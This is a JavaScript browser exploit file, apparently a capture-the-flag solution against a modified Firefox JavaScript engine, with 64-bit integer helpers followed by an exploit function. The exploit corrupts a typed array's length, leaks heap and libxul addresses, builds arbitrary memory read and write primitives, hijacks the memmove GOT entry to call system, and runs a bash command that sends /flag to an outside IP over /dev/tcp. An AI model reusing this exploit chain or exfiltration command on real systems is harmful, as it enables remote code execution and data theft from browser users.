// Much of the utility code is stolen from saleo

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}
//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements. " + v.length);
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this == other
    this.equals = operation(function(other) {
        for (var i = 0; i < 8; i++) {
            if (this.byteAt(i) != other.byteAt(i))
                return false;
        }
        return true;
    }, 1);

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a << 1
    this.assignLShift1 = operation(function lshift1(a) {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i);
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
        return this;
    }, 1);

    // this = a >> 1
    this.assignRShift1 = operation(function rshift1(a) {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i);
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
        return this;
    }, 1);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromJSValue = function(bytes) {
    bytes[7] = 0;
    bytes[6] = 0;
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return ~n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function LShift1(a) {
    return (new Int64()).assignLShift1(a);
}

function RShift1(a) {
    return (new Int64()).assignRShift1(a);
}

function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function Equals(a, b) {
    return a.equals(b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);


function print(msg) {
    console.log(msg);
    document.body.innerText += msg + '\n';
}


function exp() {
	let kaki = new Array(41);
	let ab = new ArrayBuffer(96);
	let ab_victim = new ArrayBuffer(96);
	let arr;
	let ui8_vicitm;
	for (i = 0; i < 40; i += 2) {
		kaki[i] = new Array();
		kaki[i+1] = new Uint8Array(ab);

		if (i == 20) {			
			arr = kaki[i];
			ui8_victim = kaki[i+1];
		}
	}

	for (i = 0; i < 16; i++)
		ui8_victim[i] = i;
	
	arr.blaze();
	// Corrupt the length of the victim Uint8Array
	arr[0xb] = 2**31-1;
	
	// Leak the address of the actual buffer of the victim ArrayBuffer	
	let leak_offset = 0x80;		// offset of the `emptyElementsHeader+16` pointer in victim_ab2
	let leak = []
	for (i = leak_offset; i < leak_offset + 8; i++) {
		leak.push(ui8_victim[i])
	}

	let heap_addr = LShift1(new Int64(leak));
	
	print('heap leak from the victim ArrayBuffer: ' + heap_addr);

    var memory = {
        write: function(addr, data) {
            ui8_victim.set(RShift1(addr).bytes(), 0x80);
            // Uint8Array's cache the data pointer of the underlying ArrayBuffer
            var innerView = new Uint8Array(ab_victim);
            innerView.set(data);
        },
        read: function(addr, length) {
            ui8_victim.set(RShift1(addr).bytes(), 0x80);
            // Uint8Array's cache the data pointer of the underlying ArrayBuffer
            var innerView = new Uint8Array(ab_victim);
            // arr.blaze();
            return innerView.slice(0, length);
        },
        readPointer: function(addr) {
            return new Int64(this.read(addr, 8));
        },
    };

    
    // Read a pointer into libxul from the heap
	let libxul = new Int64(memory.read(heap_addr-40, 8));
	let libxul_base = Sub(libxul, 0x6f95da0);
	print('libxul base: ' + libxul_base);


	// Replace memmove with system and trigger it via copyWithin
	const uname_system_delta = 0x86BA0;
	const memmove_offset = 0x818B220;
	const uname_offset = 0x818C1A8;

	let memmove_got = Add(libxul_base, memmove_offset);
	let uname_got = Add(libxul_base, uname_offset);

	let memmove_addr = memory.readPointer(memmove_got);
	let uname_leak = memory.readPointer(uname_got);
	let system_addr = Sub(uname_leak, uname_system_delta);
	print('read ' + memmove_addr + ' as memmove addr from ' + memmove_got);
	print('read ' + uname_leak + ' as uname addr from ' + uname_got);
	print('system addr: ' + system_addr);

	var target = new Uint8Array(100);
    var cmd = "/bin/bash -c \"cat /flag >/dev/tcp/35.157.226.2/7777\"";
    for (var i = 0; i < cmd.length; i++) {
        target[i] = cmd.charCodeAt(i);
    }

    memory.write(memmove_got, system_addr.bytes());
    target.copyWithin(0, 1);
    memory.write(memmove_got, memmove_addr.bytes());
}